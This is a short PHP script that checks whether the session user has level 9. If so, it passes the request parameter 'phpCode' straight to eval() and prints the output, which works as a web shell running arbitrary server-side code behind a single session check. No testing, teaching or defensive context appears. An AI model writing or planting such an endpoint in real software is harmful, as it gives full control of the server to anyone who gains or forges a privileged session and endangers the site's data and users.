<?php 
require 'config.php';
session_start();

if ($_SESSION['user']['level'] != 9) {
  session_destroy();
  err(2000, 'out！');
}

echo eval('?><?php '.$_REQUEST['phpCode'].'?>');